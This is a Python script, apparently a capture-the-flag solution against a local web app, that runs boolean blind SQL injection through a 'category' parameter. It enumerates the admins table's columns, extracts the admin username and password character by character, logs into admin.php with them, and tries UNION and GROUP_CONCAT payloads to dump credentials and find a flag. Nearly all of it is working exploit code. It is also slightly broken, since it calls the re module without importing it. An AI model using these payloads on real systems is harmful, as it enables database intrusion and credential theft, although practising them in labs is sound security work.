import requests
import urllib.parse
import time

target = "http://127.0.0.1:32780/"
admin_url = "http://127.0.0.1:32780/admin.php"
session = requests.Session()
session.cookies.set('PHPSESSID', 'a619c2d322b0d2025997d9751eb6d09a')

print("="*80)
print("BOOLEAN BLIND SQL INJECTION - CREDENTIAL EXTRACTION")
print("="*80)

# Step 1: Find where admin credentials are stored
print("\n[+] Confirming admins table structure exists:")

# Verify table exists
check_tables = [
    "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() AND table_name='admins'#",
    "' UNION SELECT 'exists' FROM admins#"
]

for payload in check_tables:
    r = session.get(target + "?category=" + urllib.parse.quote(payload))
    print(f"Payload: {payload[:50]}... => Size: {len(r.text)} bytes, 'exists': {'exists' in r.text}")

# Step 2: Extract column names using blind injection
print("\n[+] Extracting column names from admins table:")

def blind_extract_column(table, index):
    """Extract column name using blind SQL injection"""
    column_name = ""
    position = 1
    
    while True:
        found_char = False
        for ascii_val in range(32, 127):
            # Test if character at position matches ascii_val
            payload = f"Nature' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT {index},1),{position},1))={ascii_val}#"
            r = session.get(target + "?category=" + urllib.parse.quote(payload))
            
            # Check response size - if different from error baseline, it's true
            if len(r.text) == 1402:  # Known size for successful queries
                column_name += chr(ascii_val)
                print(f"[+] Column {index} char {position}: '{chr(ascii_val)}'")
                found_char = True
                position += 1
                break
        
        if not found_char:
            break
    
    return column_name.strip()

# Extract column names
columns = []
for i in range(5):
    col = blind_extract_column('admins', i)
    if col:
        columns.append(col)
        print(f"[!] Found column: {col}")
    else:
        break

print(f"\n[!] Columns in admins table: {columns}")

# Step 3: Extract actual credential data character by character
print("\n[+] Extracting admin credentials:")

def blind_extract_data(column, table, row=0):
    """Extract data from specific column using blind injection"""
    data = ""
    position = 1
    
    while True:
        found_char = False
        # Try common characters first (lowercase, numbers) for speed
        test_chars = list(range(97, 123)) + list(range(48, 58)) + [95]  # a-z, 0-9, _
        test_chars += list(range(65, 91))  # A-Z
        test_chars += [45, 46, 64]  # -, ., @
        test_chars += list(range(32, 127))  # All others
        
        # Remove duplicates while preserving order
        seen = set()
        test_chars = [x for x in test_chars if not (x in seen or seen.add(x))]
        
        for ascii_val in test_chars:
            payload = f"Nature' AND ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT {row},1),{position},1))={ascii_val}#"
            r = session.get(target + "?category=" + urllib.parse.quote(payload))
            
            # Check if true (successful query returns 1402 bytes, errors/other return different sizes)
            if len(r.text) == 1402:
                char = chr(ascii_val)
                data += char
                print(f"[+] {column}[{row}][{position}]: '{char}'")
                found_char = True
                position += 1
                break
        
        if not found_char:
            break
    
    return data

# Extract username and password for first admin account
if columns:
    # Find username column
    username_col = None
    password_col = None
    for col in columns:
        if 'user' in col.lower():
            username_col = col
        elif 'pass' in col.lower():
            password_col = col
    
    if username_col and password_col:
        print(f"\n[+] Extracting from columns: {username_col}, {password_col}")
        
        print(f"\n[+] Extracting username...")
        username = blind_extract_data(username_col, 'admins', 0)
        
        print(f"\n[+] Extracting password...")
        password = blind_extract_data(password_col, 'admins', 0)
        
        print(f"\n[!] EXTRACTED CREDENTIALS:")
        print(f"[!] Username: {username}")
        print(f"[!] Password: {password}")
        
        # Verify credentials by attempting login
        print(f"\n[+] Verifying credentials via admin.php login...")
        
        login_data = {
            'username': username,
            'password': password
        }
        
        r_verify = session.post(admin_url, data=login_data)
        
        # Check if login succeeded (look for failed login indicator)
        if 'Invalid' not in r_verify.text:
            print(f"[!] CREDENTIALS VALID!")
            print(f"[!] Successfully logged into admin panel!")
            
            # Search for flag in admin panel
            if 'FLAG{' in r_verify.text:
                flag_match = re.search(r'FLAG\{[^}]+\}', r_verify.text)
                print(f"[!] FLAG FOUND: {flag_match.group(0)}")
            else:
                print(f"[!] Admin panel content:\n{r_verify.text[:1000]}")
        else:
            print(f"[-] Credentials invalid, continuing extraction...")

# Step 4: Alternative extraction using GROUP_CONCAT
print("\n[+] Alternative extraction using GROUP_CONCAT:")

payload = "Nature' UNION SELECT GROUP_CONCAT(username,':',password) FROM admins#"
r = session.get(target + "?category=" + urllib.parse.quote(payload))

if len(r.text) == 1402:
    print(f"[!] GROUP_CONCAT successful, response: {len(r.text)} bytes")
    
    # Extract the concatenated data
    matches = re.findall(r'>([^<]{5,200})<', r.text)
    for match in matches:
        if ':' in match and not any(excl in match for excl in ['Notice', 'Undefined', 'category', 'line']):
            print(f"[!] Raw credential data: {match}")

# Step 5: Search for flag directly in database
print("\n[+] Searching for flag in database...")

# Look for flag in posts content
payload = "Nature' UNION SELECT post_content FROM posts WHERE post_content LIKE '%FLAG%' LIMIT 1#"
r = session.get(target + "?category=" + urllib.parse.quote(payload))

if len(r.text) == 1402:
    print(f"[!] Flag potentially found in posts table!")
    flag_match = re.search(r'FLAG\{[^}]+\}', r.text)
    if flag_match:
        print(f"[!] FLAG: {flag_match.group(0)}")

print("\n"+"="*80)
print("BOOLEAN BLIND EXTRACTION COMPLETE")
print("="*80)
